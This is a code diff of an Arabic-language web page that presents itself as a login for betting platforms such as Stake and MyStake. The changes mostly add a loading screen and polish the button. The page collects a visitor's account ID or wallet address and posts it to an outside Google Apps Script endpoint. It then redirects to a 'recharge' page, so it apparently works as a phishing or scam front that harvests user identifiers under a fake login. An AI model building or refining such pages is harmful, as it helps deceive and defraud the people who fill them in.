@@ -17,19 +17,35 @@
   .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px}
   .title{font-size:20px;font-weight:700;margin-bottom:16px}
   .group{margin-bottom:14px}
-  .label{
-    display:block;
-    font-size:15px;
-    font-weight:700;
-    color:#0f172a;
-    margin-bottom:8px;
-  }
+  .label{display:block;font-size:15px;font-weight:700;color:#0f172a;margin-bottom:8px}
   .field{width:100%;height:48px;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink);font-size:15px;padding:0 12px;outline:none}
   .field::placeholder{color:#9aa3af}
   select.field{appearance:none;-webkit-appearance:none;background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>');background-repeat:no-repeat;background-position:left 12px center;padding-left:36px}
-  .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
+  .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
   .btn[disabled]{opacity:.6;cursor:not-allowed}
   .warn{font-size:12px;color:#444;line-height:1.7;margin-top:12px;text-align:center}
+
+  /* شاشة التحميل */
+  .loading-screen{
+    position:fixed;
+    inset:0;
+    background:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:999;
+    flex-direction:column;
+    gap:12px;
+    display:none;
+  }
+  .spinner{
+    width:50px;height:50px;
+    border:4px solid #dbeafe;
+    border-top:4px solid var(--blue);
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+  }
+  @keyframes spin{100%{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
@@ -38,7 +54,7 @@
 
 <div id="app">
   <div class="shell">
-    <div class="card">
+    <div class="card" id="login-card">
       <div class="title">الدخول إلى حسابي</div>
 
       <div class="group">
@@ -63,7 +79,10 @@
         <input id="uid" class="field" type="text" inputmode="numeric" maxlength="15" placeholder="مثال: 87654321">
       </div>
 
-      <button id="go" class="btn" disabled>تأكيد</button>
+      <button id="go" class="btn" disabled>
+        🔑 تسجيل الدخول
+      </button>
+
       <div class="warn">
         بالضغط على زر المتابعة، أنت تؤكد أن عمرك 18 سنة فأكثر وأنك توافق على سياسة الخصوصية والشروط والأحكام.
       </div>
@@ -71,10 +90,18 @@
   </div>
 </div>
 
+<!-- شاشة التحميل -->
+<div class="loading-screen" id="loading-screen">
+  <div class="spinner"></div>
+  <div style="color:#0052ff;font-weight:600">جاري تسجيل الدخول...</div>
+</div>
+
 <script>
 const platformSelect = document.getElementById('platform'),
       uid = document.getElementById('uid'),
-      go = document.getElementById('go');
+      go = document.getElementById('go'),
+      loginCard = document.getElementById('login-card'),
+      loadingScreen = document.getElementById('loading-screen');
 
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6nU4N6fEejGuPLm20SxM_3yt3jiU0DiiFW4MYom7VLOJ6aojZoQ/exec";
 let platform = null;
@@ -83,21 +110,19 @@ const repReg = /^(\d)\1{6,}$/;
 function validate() {
   let val = uid.value.trim();
 
-  // منع الأحرف العربية في Wallet Address
   if(platform === "Stake" || platform === "MyStake"){
     val = val.replace(/[\u0600-\u06FF\s]+/g, '');
     uid.value = val;
   }
 
   go.disabled = true;
-
   if(!platform) return;
 
   if(platform !== "Stake" && platform !== "MyStake"){
-    if(!/^[0-9]{4,15}$/.test(val)) return;  // لازم 4 الى 15 رقم
-    if(repReg.test(val)) return;            // منع الأرقام المكررة
+    if(!/^[0-9]{4,15}$/.test(val)) return;
+    if(repReg.test(val)) return;
   } else {
-    if(val.length < 10) return;             // عنوان محفظة لازم يكون أطول
+    if(val.length < 10) return;
   }
 
   if(val.length > 0) go.disabled = false;
@@ -123,7 +148,8 @@ uid.addEventListener('input', validate);
 
 go.addEventListener('click', async () => {
   go.disabled = true;
-  go.innerText = 'تسجيل الدخول...';  // تم التعديل هنا
+  loginCard.style.display = "none";
+  loadingScreen.style.display = "flex";
 
   const formData = new FormData();
   formData.append("walletAddress", uid.value.trim());
@@ -133,21 +159,12 @@ go.addEventListener('click', async () => {
     await fetch(SCRIPT_URL, { method:'POST', body: formData });
     localStorage.setItem('walletAddress', uid.value.trim());
 
-    // إعادة ضبط النموذج
-    uid.value = '';
-    platformSelect.value = '';
-    platform = null;
-    document.getElementById('id-label').textContent = "Account ID";
-    uid.placeholder = "مثال: 87654321";
-    uid.setAttribute("inputmode","numeric");
-    uid.setAttribute("maxlength","15");
-    go.disabled = true;
-    go.innerText = 'تأكيد';
-
     window.location.href = 'fr/office/recharge.html';
   } catch(err){
+    // فشل الارسال: ارجاع المستخدم الى الفورمة
+    loadingScreen.style.display = "none";
+    loginCard.style.display = "block";
     go.disabled = false;
-    go.innerText = 'تأكيد';
   }
 });
 </script>
